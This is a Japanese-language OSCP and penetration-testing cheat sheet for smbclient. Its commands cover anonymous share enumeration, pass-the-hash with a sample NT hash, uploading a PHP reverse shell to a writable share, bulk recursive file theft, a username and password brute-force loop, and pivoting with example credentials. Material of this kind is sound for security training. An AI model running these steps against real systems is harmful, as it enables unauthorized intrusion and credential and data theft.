# smbclient

## 🎯 概要
**smbclient** は、Windows のファイル共有やプリンタ共有、あるいは Linux の Samba サーバと通信するための FTP ライクなコマンドラインツールです。ペネトレーションテストや OSCP において、SMB プロトコル（TCP 139/445）は非常に重要な列挙対象です。smbclient を使用することで、公開されている共有フォルダの特定、不適切なアクセス権（匿名ログイン）の確認、機密ファイルの取得、さらには認証情報の収集を効率的に行うことができます。

---

## 🛠 代表的な用途
- **共有の列挙**: ターゲット上の公開共有名（ADMIN$, C$, IPC$ 等）の一覧表示。
- **匿名（Null Session）アクセスの確認**: パスワードなしでアクセス可能な情報の調査。
- **ファイル転送**: 共有フォルダ内の設定ファイル、バックアップ、認証情報のダウンロードや、Web シェルのアップロード。
- **OSCP での利用ポイント**: 初期調査段階で SMB サービスを発見した際、まず匿名ログインを試行し、得られた共有内の情報を元に攻略の糸口（パスワードファイル等）を探すのに必須です。

---

## 🔍 基本コマンド
```bash
# ターゲット上の共有フォルダを一覧表示（匿名アクセス）
smbclient -L //10.10.10.1 -N

# 特定のユーザー名を使用して共有を一覧表示
smbclient -L //10.10.10.1 -U <username>

# パスワードハッシュ（NTハッシュ）を使用して共有を一覧表示
smbclient -L //10.10.10.1 -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

# 特定の共有フォルダ（例：secrets）に接続
smbclient //10.10.10.1/secrets -U <username>
```

---

## 🧪 よく使う攻撃シナリオ
- **匿名セッションによる情報漏洩**: `-N` オプションでパスワードなしでログインし、`backup` や `users` 共有からパスワードが含まれるメモや設定ファイルを奪取します。
- **Pass-the-Hash (PtH)**: 別のサービスやメモリダンプから入手した NT ハッシュを直接使用して、平文パスワードなしで共有フォルダへアクセスします。
- **書き込み権限の悪用**: Web サイトの公開ディレクトリが SMB 共有として公開されている場合、PHP 等のリバースシェルをアップロードして初期侵入（RCE）を達成します。

---

## 📌 フェーズ別コマンド例  

### 🔎 Reconnaissance（技術的偵察）
```bash
# Nmap で SMB 関連ポートの状態とバージョンを確認
nmap -p 139,445 -sV <TARGET_IP>

# NetBIOS 名の解決を試行
nbtscan -r <TARGET_IP>
```

---

### 🧭 Enumeration（外部サービスの詳細調査）
```bash
# ターゲットの共有一覧を匿名（Null Session）で確認
smbclient -L //<TARGET_IP> -N

# 特定のワークグループを指定して共有を一覧表示
smbclient -L //<TARGET_IP> -W <WORKGROUP> -N

# ポート番号（例：445以外）を指定して接続試行
smbclient -L //<TARGET_IP> -p 445 -N

# 認証が必要な共有に対しユーザー名を指定して接続
smbclient //<TARGET_IP>/<SHARE_NAME> -U <username>

# 接続後、共有内のファイルやディレクトリを一覧表示
smb: \> ls

# 共有内のディレクトリを移動
smb: \> cd <directory_name>
```

---

### 🚪 Initial Access（初期侵入）
```bash
# 共有フォルダから機密ファイル（例：secrets.txt）をダウンロード
smb: \> get secrets.txt

# ローカルにリバースシェル（shell.php）を準備し、共有へアップロード
smb: \> put shell.php

# 特定のコマンド（ls 等）を非対話的に実行して結果を取得
smbclient //<TARGET_IP>/<SHARE_NAME> -N -c "ls"

# 共有内の全ファイルを再帰的にダウンロード（一括取得）
smbclient //<TARGET_IP>/<SHARE_NAME> -N -c "prompt OFF; recurse ON; mget *"
```

---

### 🔑 Credential Access（認証情報探索）
```bash
# 発見した NT ハッシュを使用して管理者権限の共有へアクセス
smbclient //192.168.50.212/secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

# ドメイン名を明示的に指定して接続
smbclient //TARGET/C$ -U "DOMAIN\user"
```

---

### 🚪 Pivot / Port Forward（内部サービスへのアクセス）
```bash
# ローカルポートフォワード（4455）経由で内部の SMB 共有を一覧表示
smbclient -p 4455 -L //127.0.0.1 -U <username>

# Proxychains 経由で内部ネットワークの共有へアクセス
proxychains smbclient //<INTERNAL_IP>/<SHARE> -U <username>
```

---

### 🏢 Active Directory（AD）
```bash
# ドメインコントローラの SYSVOL 共有にアクセスし、GPO 関連の設定ファイルを探索
smbclient //DC.corp.local/SYSVOL -U <domain_user>

# ユーザー一覧やドメイン情報を収集するために IPC$ 共有へ接続
smbclient //DC.corp.local/IPC$ -U <domain_user>
```

---

## 🧰 便利オプション一覧
- `-L`：ターゲット上の共有フォルダをリスト表示します。
- `-N`：パスワードなし（匿名ログイン）で接続を試みます。
- `-U <user>`：接続に使用するユーザー名を指定します（`DOMAIN\user` 形式も可）。
- `-p <port>`：接続先の TCP ポートを指定します（デフォルトは 445）。
- `-W <workgroup>`：接続に使用するワークグループ名またはドメイン名を指定します。
- `-c "<command>"`：接続後に実行するコマンドを指定します（非対話モード）。
- `--pw-nt-hash`：パスワードの代わりに NT ハッシュを使用して認証します。
- `-I <IP>`：ターゲットのホスト名が解決できない場合に、接続先 IP を直接指定します。

---

## 🚀 実践例
```bash
# 【例1】匿名ログインが許可されている共有を特定し、ファイルを全取得
smbclient -L //192.168.50.150 -N
smbclient //192.168.50.150/Public -N -c "prompt OFF; recurse ON; mget *"

# 【例2】Pass-the-Hash を用いて管理者共有 C$ に接続し、システム内を探索
smbclient //192.168.50.212/C$ -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

# 【例3】ポートフォワーディング（127.0.0.1:4455）を経由して、内部サーバの共有リストを確認
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234

# 【例4】特定のユーザーを指定した共有の列挙
sudo smbclient -L 192.168.0.97 -U Test

# 【例5】共有フォルダへの対話的接続
smbclient -U <USER> \\\\<IP>\\<SHARE>

# 【例6】Pass-the-Hash（PtH）による認証
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

# 【例7】非対話モードでのファイルアップロード
smbclient //192.168.50.195/share -c 'put config.Library-ms'

# 【例8】共有フォルダ内からのファイル取得（ダウンロード）
smb: \> get Provisioning.ps1

# 【例9】非標準ポート（ポートフォワード経由）での接続
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234

# 【例10】Proxychains 経由での内部ネットワークアクセス
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234

# 【例11】パスワードリストを用いたログイン試行の自動化
# `while` ループと組み合わせて、ユーザー名とパスワードのリストから `smbclient` でのログインを連続して試行するスクリプトを作成できます。
while read username; do while read password; do smbclient -L <TARGET_IP> -U $username%$password -g -d 0; done < passwords.txt; done < usernames.txt

# 【例12】ローカルホストを介したポートフォワードの確認
# 内部ネットワークのターゲットへの接続を localhost の転送ポート（例：127.0.0.1:4455）を通して確認します。
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234

# 【例13】共有内の全ファイル一括ダウンロード
# 対話モードに入らずに、指定した共有内の全ファイルを再帰的にダウンロードする設定が、過去のやり取りや一般的な管理タスクとして推奨されています。
smbclient //TARGET/SHARE -N -c "prompt OFF; recurse ON; mget *"
```

---

## 🧩 他ツールとの組み合わせ
- **nmap** → `nmap --script smb-enum-shares` で得られた共有リストを元に、smbclient で具体的な内容を調査します。
- **CrackMapExec / NetExec** → 大規模なネットワークで共有の権限（READ/WRITE）を一括特定し、特定の重要フォルダに smbclient でピンポイントアクセスします。
- **impacket-psexec** → smbclient で `ADMIN$` 共有への書き込み権限を確認した後、`psexec.py` で OS コマンド実行（SYSTEM権限奪取）へ移行します。
- **Responder** → Windows 端末に自分（Kali）の偽 SMB 共有を `dir \\<KALI_IP>\test` 等で叩かせてハッシュを奪取します。

---

## 📝 注意点（OSCP 試験での使い方）
- **SMB バージョンの不一致**: 古い Windows ターゲットでは `protocol negotiation failed` となる場合があります。その際は `/etc/samba/smb.conf` の `[global]` セクションに `client min protocol = NT1` などを追記する必要がある場合があります。
- **スラッシュの形式**: Linux ターミナル上ではバックスラッシュ（`\`）をエスケープする必要があるため、`\\\\IP\\share` または `//IP/share` 形式が推奨されます。
- **権限の確認**: 共有に接続できても、個別のファイルへの `get` 権限がない場合があるため、一つずつ試行が必要です。

---

## 🔗 参考リンク
- 公式：[smbclient man page](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- 良質解説：[HackTricks SMB Enumeration](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
